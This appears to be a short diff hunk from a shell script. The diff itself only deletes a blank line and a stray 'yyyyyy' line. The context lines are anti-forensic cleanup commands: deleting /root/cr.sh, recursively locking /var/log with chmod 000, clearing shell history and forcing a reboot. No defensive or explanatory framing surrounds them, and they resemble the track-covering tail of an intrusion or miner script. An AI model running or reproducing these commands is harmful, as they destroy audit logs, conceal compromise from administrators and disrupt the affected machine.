@@ -29,5 +29,3 @@ rm -rf /root/cr.sh
 chmod 000 /var/log/* -R
 history -c
 shutdown -r now
-
-yyyyyy
